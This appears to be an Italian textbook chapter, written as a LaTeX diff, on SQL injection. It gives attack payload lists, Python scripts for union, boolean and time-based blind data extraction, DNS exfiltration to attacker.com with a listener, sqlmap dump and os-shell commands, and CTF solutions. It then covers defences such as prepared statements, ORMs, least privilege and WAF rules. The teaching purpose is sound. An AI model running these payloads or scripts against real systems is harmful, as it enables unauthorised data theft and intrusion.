@@ -1,0 +1,988 @@
+\chapter{SQL Injection}
+
+\section{Introduzione}
+
+SQL Injection (SQLi) è una delle vulnerabilità più critiche e diffuse nelle applicazioni web. Consente a un attaccante di manipolare query SQL inviando input malevoli, potenzialmente ottenendo accesso non autorizzato ai dati, modificando o eliminando informazioni, o persino compromettendo l'intero server database.
+
+\subsection{Impatto}
+
+\begin{itemize}
+    \item \textbf{Confidentiality:} Furto di dati sensibili (password, carte di credito, PII)
+    \item \textbf{Integrity:} Modifica o eliminazione di dati
+    \item \textbf{Availability:} DROP TABLE, denial of service
+    \item \textbf{Authentication Bypass:} Accesso senza credenziali valide
+    \item \textbf{Remote Code Execution:} In alcuni casi (xp\_cmdshell su SQL Server)
+\end{itemize}
+
+\subsection{Statistiche}
+
+\begin{itemize}
+    \item Presente nel \textbf{25\%} delle applicazioni web
+    \item Causa di alcuni dei più grandi data breach della storia
+    \item Facile da automatizzare con tool come sqlmap
+    \item Ancora molto comune nonostante soluzioni note
+\end{itemize}
+
+\section{Concetti Fondamentali}
+
+\subsection{Come funziona SQL Injection}
+
+SQL Injection sfrutta la mancanza di sanitizzazione dell'input utente che viene concatenato direttamente nelle query SQL.
+
+\subsubsection{Anatomia di una query vulnerabile}
+
+\begin{lstlisting}[language=PHP, caption=Query vulnerabile]
+<?php
+// Input utente
+$username = $_POST['username'];  // "admin"
+$password = $_POST['password'];  // "password123"
+
+// Query costruita con concatenazione (VULNERABILE!)
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+
+// Query risultante:
+// SELECT * FROM users WHERE username = 'admin' AND password = 'password123'
+?>
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+\begin{lstlisting}[language=PHP, caption=SQL Injection - Authentication Bypass]
+<?php
+// Input malevolo
+$username = "admin' --";
+$password = "qualsiasi";
+
+// Query risultante:
+// SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'qualsiasi'
+
+// Il -- commenta il resto della query, bypassando il controllo password!
+?>
+\end{lstlisting}
+
+\subsection{Diagramma di attacco}
+
+\begin{verbatim}
+[Attacker]
+    |
+    | 1. Invia input: username=admin'--
+    v
+[Web Application]
+    |
+    | 2. Concatena input in query SQL
+    | Query: SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
+    v
+[Database]
+    |
+    | 3. Esegue query modificata
+    | 4. Restituisce dati admin (senza verificare password)
+    v
+[Web Application]
+    |
+    | 5. Autentica l'attaccante come admin
+    v
+[Attacker] - Accesso ottenuto!
+\end{verbatim}
+
+\section{Tipologie di SQL Injection}
+
+\subsection{1. In-Band SQL Injection}
+
+L'attaccante usa lo stesso canale di comunicazione per iniettare SQL e recuperare risultati.
+
+\subsubsection{Error-Based SQL Injection}
+
+Sfrutta messaggi di errore del database per estrarre informazioni.
+
+\begin{lstlisting}[language=PHP, caption=Error-Based SQLi - Enumerazione database]
+<?php
+// URL: /product.php?id=1'
+$id = $_GET['id'];
+$query = "SELECT * FROM products WHERE id = $id";
+
+// Input attaccante: 1' AND 1=CONVERT(int, (SELECT @@version))--
+// Errore restituito:
+// "Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to data type int"
+
+// L'attaccante ottiene la versione del DB dall'errore!
+?>
+\end{lstlisting}
+
+\textbf{Payload comuni error-based:}
+
+\begin{lstlisting}[language=SQL, caption=Payload error-based]
+-- MySQL - Estrarre nome database
+1' AND extractvalue(1, concat(0x7e, database())) --
+
+-- PostgreSQL - Estrarre versione
+1' AND 1=CAST((SELECT version()) AS int) --
+
+-- SQL Server - Estrarre nome utente
+1' AND 1=CONVERT(int, (SELECT SYSTEM_USER)) --
+
+-- Oracle - Estrarre nome database
+1' AND 1=CAST((SELECT user FROM dual) AS number) --
+\end{lstlisting}
+
+\subsubsection{Union-Based SQL Injection}
+
+Utilizza l'operatore UNION per combinare risultati di query multiple.
+
+\begin{lstlisting}[language=PHP, caption=Union-Based SQLi]
+<?php
+// Query originale
+$id = $_GET['id'];
+$query = "SELECT name, price FROM products WHERE id = $id";
+
+// Attacco UNION
+// Input: 1' UNION SELECT username, password FROM users--
+// Query risultante:
+// SELECT name, price FROM products WHERE id = 1'
+// UNION SELECT username, password FROM users--
+?>
+\end{lstlisting}
+
+\textbf{Step-by-step Union-Based attack:}
+
+\begin{lstlisting}[language=SQL, caption=Union-Based attack progression]
+-- Step 1: Determinare numero di colonne
+1' ORDER BY 1--   (Success)
+1' ORDER BY 2--   (Success)
+1' ORDER BY 3--   (Error: "Unknown column '3'")
+-- Conclusione: 2 colonne
+
+-- Step 2: Identificare colonne visualizzate
+1' UNION SELECT 'test1', 'test2'--
+-- Output mostra entrambe: la query originale ha 2 colonne visualizzabili
+
+-- Step 3: Enumerare database
+1' UNION SELECT schema_name, NULL FROM information_schema.schemata--
+
+-- Step 4: Enumerare tabelle
+1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='target_db'--
+
+-- Step 5: Enumerare colonne
+1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
+
+-- Step 6: Estrarre dati
+1' UNION SELECT username, password FROM users--
+\end{lstlisting}
+
+\subsubsection{Esempio completo Union-Based (Python)}
+
+\begin{lstlisting}[language=Python, caption=Union-Based SQLi exploitation script]
+import requests
+
+BASE_URL = "http://vulnerable-app.com/product.php"
+
+def test_sqli(payload):
+    """Test SQL injection payload"""
+    response = requests.get(BASE_URL, params={'id': payload})
+    return response.text
+
+# Step 1: Determinare numero di colonne
+for i in range(1, 10):
+    payload = f"1' ORDER BY {i}--"
+    response = test_sqli(payload)
+    if "error" in response.lower():
+        columns = i - 1
+        print(f"Numero di colonne: {columns}")
+        break
+
+# Step 2: Identificare colonne visualizzate
+null_string = ", NULL" * (columns - 1)
+payload = f"1' UNION SELECT 'TEST'{null_string}--"
+response = test_sqli(payload)
+print(f"Test colonne: {response}")
+
+# Step 3: Estrarre dati
+payload = f"1' UNION SELECT username, password{null_string[7:]} FROM users--"
+data = test_sqli(payload)
+print(f"Dati estratti:\n{data}")
+\end{lstlisting}
+
+\subsection{2. Blind SQL Injection}
+
+L'applicazione non mostra risultati delle query o errori, ma l'attaccante può inferire informazioni osservando il comportamento.
+
+\subsubsection{Boolean-Based Blind SQLi}
+
+L'attaccante deduce informazioni in base a risposte TRUE/FALSE.
+
+\begin{lstlisting}[language=PHP, caption=Boolean-Based Blind SQLi]
+<?php
+// Codice vulnerabile
+$id = $_GET['id'];
+$query = "SELECT * FROM products WHERE id = $id";
+$result = mysqli_query($conn, $query);
+
+if (mysqli_num_rows($result) > 0) {
+    echo "Prodotto trovato";
+} else {
+    echo "Prodotto non trovato";
+}
+
+// L'applicazione non mostra dati ma indica se il prodotto exists
+?>
+\end{lstlisting}
+
+\textbf{Exploitation Boolean-Based:}
+
+\begin{lstlisting}[language=SQL, caption=Boolean-Based attack]
+-- Test se il primo carattere del database è 't'
+1' AND SUBSTRING(database(), 1, 1) = 't'--
+-- Se "Prodotto trovato" → TRUE, altrimenti FALSE
+
+-- Test secondo carattere
+1' AND SUBSTRING(database(), 2, 1) = 'e'--
+
+-- Test terzo carattere
+1' AND SUBSTRING(database(), 3, 1) = 's'--
+
+-- Risultato: database = "test..."
+\end{lstlisting}
+
+\textbf{Script automatizzato Boolean-Based:}
+
+\begin{lstlisting}[language=Python, caption=Boolean-Based Blind SQLi script]
+import requests
+import string
+
+BASE_URL = "http://vulnerable-app.com/product.php"
+
+def test_condition(condition):
+    """Test se una condizione SQL è TRUE"""
+    payload = f"1' AND {condition}--"
+    response = requests.get(BASE_URL, params={'id': payload})
+    return "Prodotto trovato" in response.text
+
+def extract_string(query, max_length=50):
+    """Estrae una stringa character by character"""
+    result = ""
+    charset = string.ascii_lowercase + string.digits + '_@.-'
+
+    for position in range(1, max_length + 1):
+        for char in charset:
+            # Test: SUBSTRING(({query}), {position}, 1) = '{char}'
+            condition = f"SUBSTRING(({query}), {position}, 1) = '{char}'"
+
+            if test_condition(condition):
+                result += char
+                print(f"Carattere trovato: {result}")
+                break
+        else:
+            # Nessun carattere trovato, fine stringa
+            break
+
+    return result
+
+# Estrai nome database
+db_name = extract_string("SELECT database()")
+print(f"Database: {db_name}")
+
+# Estrai versione
+version = extract_string("SELECT version()")
+print(f"Versione: {version}")
+
+# Estrai username
+username = extract_string("SELECT username FROM users LIMIT 1")
+print(f"Username: {username}")
+\end{lstlisting}
+
+\subsubsection{Time-Based Blind SQLi}
+
+L'attaccante causa ritardi nell'esecuzione delle query per inferire informazioni.
+
+\begin{lstlisting}[language=PHP, caption=Time-Based Blind SQLi - Setup]
+<?php
+// Codice vulnerabile
+$id = $_GET['id'];
+$query = "SELECT * FROM products WHERE id = $id";
+mysqli_query($conn, $query);
+
+// Nessun output, nessun errore, nessuna differenza visibile
+echo "Query eseguita";
+?>
+\end{lstlisting}
+
+\textbf{Payload Time-Based:}
+
+\begin{lstlisting}[language=SQL, caption=Time-Based payloads per diversi DBMS]
+-- MySQL
+1' AND IF(1=1, SLEEP(5), 0)--
+1' AND IF(SUBSTRING(database(),1,1)='t', SLEEP(5), 0)--
+
+-- PostgreSQL
+1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+
+-- SQL Server
+1'; IF (1=1) WAITFOR DELAY '00:00:05'--
+
+-- Oracle
+1' AND CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE NULL END IS NULL--
+\end{lstlisting}
+
+\textbf{Script Time-Based exploitation:}
+
+\begin{lstlisting}[language=Python, caption=Time-Based Blind SQLi script]
+import requests
+import time
+import string
+
+BASE_URL = "http://vulnerable-app.com/product.php"
+DELAY = 5  # secondi
+
+def test_condition_time(condition, delay=DELAY):
+    """Test condizione SQL basandosi sul tempo di risposta"""
+    payload = f"1' AND IF({condition}, SLEEP({delay}), 0)--"
+
+    start = time.time()
+    requests.get(BASE_URL, params={'id': payload}, timeout=delay+2)
+    elapsed = time.time() - start
+
+    return elapsed >= delay
+
+def extract_string_time(query, max_length=50):
+    """Estrae stringa usando time-based blind SQLi"""
+    result = ""
+    charset = string.ascii_lowercase + string.digits + '_@.-'
+
+    for position in range(1, max_length + 1):
+        for char in charset:
+            condition = f"SUBSTRING(({query}), {position}, 1) = '{char}'"
+
+            print(f"Testing posizione {position}, carattere '{char}'...", end='')
+
+            if test_condition_time(condition):
+                result += char
+                print(f" TROVATO! Stringa corrente: {result}")
+                break
+            else:
+                print(" no")
+        else:
+            break
+
+    return result
+
+# Estrazione dati
+database_name = extract_string_time("SELECT database()")
+print(f"\nDatabase estratto: {database_name}")
+\end{lstlisting}
+
+\subsection{3. Out-of-Band SQL Injection}
+
+L'attaccante fa esfiltrare dati attraverso un canale diverso (DNS, HTTP).
+
+\begin{lstlisting}[language=SQL, caption=Out-of-Band SQLi - DNS exfiltration (MySQL)]
+-- MySQL con LOAD_FILE per trigger DNS lookup
+1' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'))--
+
+-- Il DNS lookup a "testdb.attacker.com" rivela il nome del database
+
+-- SQL Server con xp_dirtree
+1'; EXEC master..xp_dirtree '\\' + (SELECT TOP 1 username FROM users) + '.attacker.com\share'--
+\end{lstlisting}
+
+\begin{lstlisting}[language=Python, caption=Out-of-Band - Server DNS per catturare dati]
+# Server DNS listener (attacker-controlled)
+from dnslib.server import DNSServer, DNSLogger, DNSRecord
+from dnslib import RR, QTYPE, A
+import re
+
+class ExfiltrationDNSResolver:
+    def resolve(self, request, handler):
+        qname = str(request.q.qname)
+        print(f"DNS query ricevuta: {qname}")
+
+        # Estrae dati dal subdomain
+        # Formato: [data].attacker.com
+        match = re.match(r'^([^.]+)\.attacker\.com', qname)
+        if match:
+            exfiltrated_data = match.group(1)
+            print(f"[+] Dato esfiltrato: {exfiltrated_data}")
+
+        # Risponde con un IP valido
+        reply = request.reply()
+        reply.add_answer(RR(qname, QTYPE.A, rdata=A("1.2.3.4"), ttl=60))
+        return reply
+
+# Avvia server DNS sulla porta 53
+resolver = ExfiltrationDNSResolver()
+server = DNSServer(resolver, port=53)
+server.start_thread()
+print("DNS server in ascolto per exfiltration...")
+\end{lstlisting}
+
+\section{Second-Order SQL Injection}
+
+SQL injection che si manifesta in un punto diverso da dove l'input viene inserito.
+
+\begin{lstlisting}[language=PHP, caption=Second-Order SQLi esempio]
+<?php
+// Step 1: Registrazione utente (input salvato nel DB)
+$username = $_POST['username'];  // Input: admin'--
+
+// Sanitizzato per l'insert (escaped)
+$safe_username = mysqli_real_escape_string($conn, $username);
+$query = "INSERT INTO users (username) VALUES ('$safe_username')";
+mysqli_query($conn, $query);
+// Username "admin'--" salvato nel database
+
+// Step 2: Profilo utente (dati letti dal DB e usati in query)
+session_start();
+$current_user = $_SESSION['username'];  // "admin'--" letto dal DB!
+
+// VULNERABILE: Dati dal DB usati senza escaping
+$query = "SELECT * FROM posts WHERE author = '$current_user'";
+// Query: SELECT * FROM posts WHERE author = 'admin'--'
+mysqli_query($conn, $query);
+?>
+\end{lstlisting}
+
+\textbf{Protezione Second-Order:}
+
+\begin{lstlisting}[language=PHP, caption=Protezione con prepared statements]
+<?php
+// SICURO: Prepared statements anche per dati dal database
+$current_user = $_SESSION['username'];
+
+$stmt = $pdo->prepare("SELECT * FROM posts WHERE author = ?");
+$stmt->execute([$current_user]);
+// Safe anche se $current_user contiene caratteri speciali SQL
+?>
+\end{lstlisting}
+
+\section{Protezione da SQL Injection}
+
+\subsection{1. Prepared Statements (Parametrized Queries)}
+
+La difesa più efficace contro SQL injection.
+
+\subsubsection{PHP - PDO}
+
+\begin{lstlisting}[language=PHP, caption=PHP PDO Prepared Statements]
+<?php
+// SICURO: Prepared statements con PDO
+$pdo = new PDO("mysql:host=localhost;dbname=mydb", "user", "pass");
+
+// Named parameters
+$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND active = :active");
+$stmt->execute([
+    ':username' => $_POST['username'],
+    ':active' => 1
+]);
+
+// Positional parameters
+$stmt = $pdo->prepare("SELECT * FROM products WHERE category = ? AND price < ?");
+$stmt->execute([$category, $max_price]);
+
+// Fetch results
+$user = $stmt->fetch(PDO::FETCH_ASSOC);
+?>
+\end{lstlisting}
+
+\subsubsection{Python - DB-API}
+
+\begin{lstlisting}[language=Python, caption=Python Prepared Statements]
+import mysql.connector
+
+# SICURO: Parametrized queries
+conn = mysql.connector.connect(
+    host="localhost",
+    user="user",
+    password="password",
+    database="mydb"
+)
+
+cursor = conn.cursor()
+
+# Named placeholders (dictionary)
+sql = "SELECT * FROM users WHERE username = %(username)s AND email = %(email)s"
+cursor.execute(sql, {'username': username, 'email': email})
+
+# Positional placeholders
+sql = "INSERT INTO products (name, price, stock) VALUES (%s, %s, %s)"
+cursor.execute(sql, (product_name, price, stock))
+
+conn.commit()
+cursor.close()
+conn.close()
+\end{lstlisting}
+
+\subsubsection{Java - PreparedStatement}
+
+\begin{lstlisting}[language=Java, caption=Java PreparedStatement]
+import java.sql.*;
+
+public class SecureDatabase {
+    public User getUserByCredentials(String username, String password) {
+        String sql = "SELECT * FROM users WHERE username = ? AND password_hash = ?";
+
+        try (Connection conn = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
+             PreparedStatement pstmt = conn.prepareStatement(sql)) {
+
+            pstmt.setString(1, username);
+            pstmt.setString(2, hashPassword(password));
+
+            ResultSet rs = pstmt.executeQuery();
+
+            if (rs.next()) {
+                return new User(
+                    rs.getInt("id"),
+                    rs.getString("username"),
+                    rs.getString("email")
+                );
+            }
+        } catch (SQLException e) {
+            logger.error("Database error", e);
+        }
+
+        return null;
+    }
+}
+\end{lstlisting}
+
+\subsection{2. ORM (Object-Relational Mapping) Sicuri}
+
+\subsubsection{Python - SQLAlchemy}
+
+\begin{lstlisting}[language=Python, caption=SQLAlchemy ORM sicuro]
+from sqlalchemy import create_engine, Column, Integer, String
+from sqlalchemy.ext.declarative import declarative_base
+from sqlalchemy.orm import sessionmaker
+
+Base = declarative_base()
+
+class User(Base):
+    __tablename__ = 'users'
+
+    id = Column(Integer, primary_key=True)
+    username = Column(String(50), unique=True)
+    email = Column(String(100))
+
+# Setup
+engine = create_engine('mysql://user:pass@localhost/mydb')
+Session = sessionmaker(bind=engine)
+session = Session()
+
+# SICURO: ORM previene SQL injection automaticamente
+# Query con filtri
+user = session.query(User).filter(User.username == user_input).first()
+
+# Query con multiple condizioni
+users = session.query(User).filter(
+    User.username.like(f'%{search_term}%'),
+    User.active == True
+).all()
+
+# ATTENZIONE: Raw SQL può ancora essere vulnerabile!
+# VULNERABILE:
+result = session.execute(f"SELECT * FROM users WHERE username = '{username}'")
+
+# SICURO con raw SQL:
+result = session.execute(
+    "SELECT * FROM users WHERE username = :username",
+    {'username': username}
+)
+\end{lstlisting}
+
+\subsubsection{PHP - Doctrine ORM}
+
+\begin{lstlisting}[language=PHP, caption=Doctrine ORM sicuro]
+<?php
+use Doctrine\ORM\EntityManager;
+
+// SICURO: DQL (Doctrine Query Language) con parametri
+$dql = "SELECT u FROM User u WHERE u.username = :username AND u.active = :active";
+$query = $entityManager->createQuery($dql);
+$query->setParameter('username', $_POST['username']);
+$query->setParameter('active', true);
+$users = $query->getResult();
+
+// SICURO: Query Builder
+$queryBuilder = $entityManager->createQueryBuilder();
+$users = $queryBuilder
+    ->select('u')
+    ->from('User', 'u')
+    ->where('u.email = :email')
+    ->setParameter('email', $email)
+    ->getQuery()
+    ->getResult();
+
+// SICURO: Repository pattern
+$userRepository = $entityManager->getRepository(User::class);
+$user = $userRepository->findOneBy(['username' => $username]);
+?>
+\end{lstlisting}
+
+\subsubsection{Java - Hibernate ORM}
+
+\begin{lstlisting}[language=Java, caption=Hibernate ORM sicuro]
+import org.hibernate.Session;
+import org.hibernate.query.Query;
+import javax.persistence.criteria.*;
+
+public class UserDAO {
+    private SessionFactory sessionFactory;
+
+    // SICURO: HQL con named parameters
+    public User findByUsername(String username) {
+        Session session = sessionFactory.openSession();
+
+        String hql = "FROM User u WHERE u.username = :username";
+        Query<User> query = session.createQuery(hql, User.class);
+        query.setParameter("username", username);
+
+        return query.uniqueResult();
+    }
+
+    // SICURO: Criteria API (type-safe)
+    public List<User> findActiveUsers(String emailDomain) {
+        Session session = sessionFactory.openSession();
+        CriteriaBuilder cb = session.getCriteriaBuilder();
+        CriteriaQuery<User> cq = cb.createQuery(User.class);
+        Root<User> root = cq.from(User.class);
+
+        cq.select(root).where(
+            cb.and(
+                cb.equal(root.get("active"), true),
+                cb.like(root.get("email"), "%" + emailDomain)
+            )
+        );
+
+        return session.createQuery(cq).getResultList();
+    }
+}
+\end{lstlisting}
+
+\subsection{3. Input Validation}
+
+\begin{lstlisting}[language=Python, caption=Input validation whitelist]
+import re
+
+class SQLInputValidator:
+    @staticmethod
+    def validate_integer(value):
+        """Valida che l'input sia un intero"""
+        try:
+            return int(value)
+        except ValueError:
+            raise ValueError("Input deve essere un intero")
+
+    @staticmethod
+    def validate_alphanumeric(value, max_length=50):
+        """Valida che l'input sia alfanumerico"""
+        if not re.match(r'^[a-zA-Z0-9_]+$', value):
+            raise ValueError("Input deve essere alfanumerico")
+
+        if len(value) > max_length:
+            raise ValueError(f"Input troppo lungo (max {max_length})")
+
+        return value
+
+    @staticmethod
+    def validate_email(value):
+        """Valida formato email"""
+        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
+        if not re.match(pattern, value):
+            raise ValueError("Email non valida")
+        return value
+
+# Uso
+try:
+    user_id = SQLInputValidator.validate_integer(request.args.get('id'))
+    username = SQLInputValidator.validate_alphanumeric(request.form.get('username'))
+    email = SQLInputValidator.validate_email(request.form.get('email'))
+except ValueError as e:
+    return f"Input non valido: {e}", 400
+\end{lstlisting}
+
+\subsection{4. Least Privilege}
+
+\begin{lstlisting}[language=SQL, caption=Principio del minimo privilegio]
+-- Crea utente con privilegi limitati per l'applicazione web
+CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
+
+-- Concedi SOLO i privilegi necessari
+GRANT SELECT, INSERT, UPDATE ON mydb.users TO 'webapp'@'localhost';
+GRANT SELECT, INSERT ON mydb.orders TO 'webapp'@'localhost';
+GRANT SELECT ON mydb.products TO 'webapp'@'localhost';
+
+-- NON concedere:
+-- - DELETE (se non necessario)
+-- - DROP
+-- - ALTER
+-- - GRANT
+-- - FILE (per LOAD_FILE)
+-- - SUPER
+
+-- Applica modifiche
+FLUSH PRIVILEGES;
+\end{lstlisting}
+
+\subsection{5. WAF (Web Application Firewall)}
+
+\begin{lstlisting}[language=bash, caption=ModSecurity rules per SQL injection]
+# ModSecurity Core Rule Set - SQL Injection protection
+
+# Blocca common SQL keywords
+SecRule REQUEST_URI|ARGS|REQUEST_HEADERS \
+    "@rx (?i:(\bunion\b.{1,100}?\bselect\b|\bselect\b.{1,100}?\bfrom\b))" \
+    "id:942100,\
+    phase:2,\
+    block,\
+    msg:'SQL Injection Attack Detected',\
+    severity:'CRITICAL'"
+
+# Blocca SQL comments
+SecRule REQUEST_URI|ARGS \
+    "@rx (?i:(--|\#|/\*|\*/|\bor\b\s+\d+\s*=\s*\d+))" \
+    "id:942110,\
+    phase:2,\
+    block,\
+    msg:'SQL Comment Sequence Detected'"
+
+# Blocca UNION attacks
+SecRule ARGS "@rx (?i:\bunion\b.*\bselect\b)" \
+    "id:942120,\
+    phase:2,\
+    block,\
+    msg:'UNION-based SQL Injection'"
+\end{lstlisting}
+
+\section{Detection e Testing}
+
+\subsection{Manual Testing}
+
+\begin{lstlisting}[language=bash, caption=Payload manuali per testing]
+# Test base
+'
+"
+`
+')
+")
+`)
+
+# Boolean-based
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+
+# Time-based
+'; WAITFOR DELAY '00:00:05'--
+' AND SLEEP(5)--
+' || pg_sleep(5)--
+
+# Union-based
+' UNION SELECT NULL--
+' UNION SELECT NULL, NULL--
+' UNION SELECT NULL, NULL, NULL--
+
+# Error-based
+' AND 1=CONVERT(int, @@version)--
+' AND extractvalue(1, concat(0x7e, database()))--
+\end{lstlisting}
+
+\subsection{Automated Testing - sqlmap}
+
+\begin{lstlisting}[language=bash, caption=sqlmap - SQL injection automation]
+# Test base
+sqlmap -u "http://target.com/page.php?id=1"
+
+# Con cookie di autenticazione
+sqlmap -u "http://target.com/page.php?id=1" \
+    --cookie="PHPSESSID=abcd1234"
+
+# Test POST parameters
+sqlmap -u "http://target.com/login.php" \
+    --data="username=admin&password=pass"
+
+# Enumerazione database
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+
+# Enumerazione tabelle
+sqlmap -u "http://target.com/page.php?id=1" \
+    -D database_name --tables
+
+# Dump dati
+sqlmap -u "http://target.com/page.php?id=1" \
+    -D database_name -T users --dump
+
+# OS shell (se possibile)
+sqlmap -u "http://target.com/page.php?id=1" --os-shell
+
+# Livello e rischio più alti
+sqlmap -u "http://target.com/page.php?id=1" \
+    --level=5 --risk=3
+\end{lstlisting}
+
+\section{Esercizi CTF-Style}
+
+\subsection{Challenge 1: Basic Authentication Bypass}
+
+URL: \texttt{http://ctf-sqli.local/login.php}
+
+\begin{lstlisting}[language=PHP]
+<?php
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+$result = mysqli_query($conn, $query);
+
+if (mysqli_num_rows($result) > 0) {
+    echo "Flag: CTF{b4s1c_4uth_byp4ss}";
+}
+?>
+\end{lstlisting}
+
+\textbf{Soluzione:}
+\begin{itemize}
+    \item Username: \texttt{admin' --}
+    \item Password: (qualsiasi)
+\end{itemize}
+
+\subsection{Challenge 2: Union-Based Data Extraction}
+
+URL: \texttt{http://ctf-sqli.local/product.php?id=1}
+
+Obiettivo: Estrarre la password dell'admin dalla tabella \texttt{users}.
+
+\textbf{Soluzione:}
+
+\begin{lstlisting}[language=bash]
+# Step 1: Numero colonne
+?id=1' ORDER BY 3--  (success)
+?id=1' ORDER BY 4--  (error) → 3 colonne
+
+# Step 2: Identifica colonne visualizzate
+?id=1' UNION SELECT 'A', 'B', 'C'--
+
+# Step 3: Estrai dati
+?id=1' UNION SELECT username, password, email FROM users WHERE username='admin'--
+
+# Flag: CTF{un10n_b4s3d_3xtr4ct10n}
+\end{lstlisting}
+
+\subsection{Challenge 3: Blind Boolean-Based}
+
+URL: \texttt{http://ctf-sqli.local/check.php?id=1}
+
+L'applicazione risponde solo con "Valid" o "Invalid".
+
+\textbf{Soluzione script:}
+
+\begin{lstlisting}[language=Python]
+import requests
+import string
+
+url = "http://ctf-sqli.local/check.php"
+flag = ""
+
+for position in range(1, 50):
+    for char in string.ascii_letters + string.digits + '{}_{}-':
+        payload = f"1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), {position}, 1) = '{char}'--"
+
+        response = requests.get(url, params={'id': payload})
+
+        if "Valid" in response.text:
+            flag += char
+            print(f"Flag: {flag}")
+            break
+    else:
+        break
+
+print(f"Flag completo: {flag}")
+\end{lstlisting}
+
+\subsection{Challenge 4: Time-Based Blind}
+
+URL: \texttt{http://ctf-sqli.local/api.php?user_id=1}
+
+Nessun output, solo status code 200.
+
+\textbf{Payload:}
+
+\begin{lstlisting}[language=bash]
+# Test time-based
+?user_id=1' AND IF(1=1, SLEEP(5), 0)--
+
+# Estrai primo carattere della flag
+?user_id=1' AND IF(SUBSTRING((SELECT flag FROM ctf_flags LIMIT 1), 1, 1) = 'C', SLEEP(5), 0)--
+\end{lstlisting}
+
+\section{Best Practices Summary}
+
+\begin{itemize}
+    \item[$\square$] \textbf{SEMPRE} usare prepared statements o ORM
+    \item[$\square$] \textbf{MAI} concatenare input utente in query SQL
+    \item[$\square$] Validare input lato server (whitelist approach)
+    \item[$\square$] Applicare principio del minimo privilegio per DB user
+    \item[$\square$] Disabilitare messaggi di errore dettagliati in produzione
+    \item[$\square$] Implementare WAF per defense in depth
+    \item[$\square$] Logging di query sospette
+    \item[$\square$] Audit regolare del codice
+    \item[$\square$] Testing automatizzato (SAST, DAST)
+    \item[$\square$] Formazione sviluppatori su secure coding
+\end{itemize}
+
+\section{Tools Consigliati}
+
+\begin{itemize}
+    \item \textbf{sqlmap:} Automated SQL injection and database takeover
+    \item \textbf{Burp Suite:} Web vulnerability scanner
+    \item \textbf{OWASP ZAP:} Open-source web application security scanner
+    \item \textbf{SQLNinja:} SQL Server injection and takeover tool
+    \item \textbf{jSQL Injection:} Java-based SQL injection tool
+    \item \textbf{NoSQLMap:} NoSQL database injection tool
+\end{itemize}
+
+\section{Case Study: Heartland Payment Systems (2008)}
+
+\subsection{Contesto}
+
+Heartland Payment Systems, uno dei maggiori processori di pagamenti USA, subì un attacco SQL injection che compromise 130 milioni di carte di credito.
+
+\subsection{Attacco}
+
+\begin{enumerate}
+    \item \textbf{Reconnaissance:} Scansione automatizzata per vulnerabilità SQLi
+    \item \textbf{Exploitation:} SQL injection in un form web non protetto
+    \item \textbf{Privilege Escalation:} Ottenuto accesso al database principale
+    \item \textbf{Data Exfiltration:} Installato sniffer per catturare dati carte
+    \item \textbf{Persistence:} Backdoor per accesso continuato
+\end{enumerate}
+
+\subsection{Impatto}
+
+\begin{itemize}
+    \item 130 milioni di carte compromesse
+    \item \$140 milioni di perdite
+    \item Multa di \$110 milioni
+    \item Damage reputazionale incalcolabile
+\end{itemize}
+
+\subsection{Lezioni}
+
+\begin{itemize}
+    \item Input validation è critica
+    \item Prepared statements prevengono SQL injection
+    \item Defense in depth: anche con SQLi, encryption avrebbe limitato i danni
+    \item Monitoring e IDS possono rilevare exfiltration
+\end{itemize}
+
+\section{Conclusioni}
+
+SQL Injection rimane una delle vulnerabilità più pericolose e comuni. Nonostante soluzioni note (prepared statements) siano disponibili da decenni, continua a causare breach significativi.
+
+\textbf{Takeaway chiave:}
+\begin{itemize}
+    \item La difesa primaria è l'uso di prepared statements
+    \item Nessun altro metodo (escaping, blacklist) è altrettanto sicuro
+    \item ORM aiutano ma non sono bulletproof
+    \item Testing regolare è essenziale
+    \item La security education degli sviluppatori è fondamentale
+\end{itemize}
+
+Nel prossimo capitolo esploreremo Cross-Site Scripting (XSS), un'altra vulnerabilità injection che colpisce il lato client.
